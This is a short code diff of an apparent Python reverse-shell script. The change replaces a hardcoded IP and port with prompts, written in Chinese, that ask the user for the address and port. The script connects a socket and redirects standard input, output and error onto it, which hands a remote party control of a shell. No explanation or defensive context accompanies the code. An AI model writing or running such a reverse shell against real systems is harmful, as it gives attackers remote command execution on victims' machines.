@@ -3,7 +3,9 @@ import subprocess
 import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.5.100.184", 4445))
+ip = input("请输入IP")
+port = int(input("请输入端口"))
+s.connect((ip, port))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
